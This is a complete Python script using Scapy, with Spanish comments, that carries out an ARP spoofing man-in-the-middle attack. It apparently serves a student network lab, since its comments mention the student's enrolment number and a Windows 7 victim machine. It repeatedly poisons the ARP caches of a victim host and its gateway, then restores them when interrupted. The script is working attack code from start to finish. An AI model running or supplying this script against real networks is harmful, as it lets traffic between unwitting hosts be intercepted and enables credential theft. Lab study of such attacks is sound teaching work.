from scapy.all import *
import time
import sys

# Configuración basada en tu matrícula (24.12.52.0/24)
# Asegúrate de verificar las IPs exactas en tu laboratorio
VICTIM_IP = "24.12.52.4"  # Sustituye X por la IP de tu Windows 7
GATEWAY_IP = "24.12.52.1" # Sustituye si tu Router tiene otra IP

def get_mac(ip):
    """Obtiene la dirección MAC de una IP dada enviando una petición ARP."""
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    
    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        print(f"[-] No se pudo obtener la MAC para {ip}")
        sys.exit(1)

def spoof(target_ip, spoof_ip):
    """
    Envía un paquete ARP falso.
    op=2 significa 'respuesta ARP' (is-at).
    Le decimos al target_ip que la spoof_ip tiene NUESTRA mac (hwdst se llena auto con scapy).
    """
    target_mac = get_mac(target_ip)
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)

def restore(dest_ip, source_ip):
    """Restaura las tablas ARP a la normalidad al finalizar."""
    dest_mac = get_mac(dest_ip)
    source_mac = get_mac(source_ip)
    packet = ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
    send(packet, count=4, verbose=False)

try:
    print(f"[*] Iniciando ataque ARP Spoofing contra {VICTIM_IP}...")
    sent_packets_count = 0
    while True:
        # Engañar a la víctima: "Yo soy el Router"
        spoof(VICTIM_IP, GATEWAY_IP)
        # Engañar al router: "Yo soy la víctima"
        spoof(GATEWAY_IP, VICTIM_IP)
        
        sent_packets_count += 2
        print(f"\r[+] Paquets enviados: {sent_packets_count}", end="")
        time.sleep(2) # Intervalo para no saturar demasiado
except KeyboardInterrupt:
    print("\n[!] Detectado CTRL+C. Restaurando tablas ARP... por favor espera.")
    restore(VICTIM_IP, GATEWAY_IP)
    restore(GATEWAY_IP, VICTIM_IP)
    print("[*] Tablas restauradas. Cerrando.")
